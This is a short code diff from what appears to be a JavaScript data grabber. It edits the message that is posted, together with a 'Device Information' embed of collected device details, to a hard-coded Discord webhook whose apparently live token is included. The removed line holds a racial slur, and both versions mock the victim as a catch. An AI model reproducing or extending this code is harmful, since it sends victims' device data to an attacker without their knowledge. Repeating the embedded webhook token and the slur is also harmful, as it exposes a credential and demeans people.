@@ -83,7 +83,7 @@
         const webhookURL = 'https://discordapp.com/api/webhooks/1328419730746507334/s74lZMLO-gct3JQh6p8ID36B82EJqPGskoBYsdB7i9jz9XTCDMEzcF5mvnXgrKuFOC0Z';
         
         const payload = {
-            content: "New Nigga sniped",
+            content: "New Body Catched LMAO",
             embeds: [{
                 title: "Device Information",
                 description: Object.entries(info).map(([key, value]) => `**${key}**: ${value}`).join("\n"),
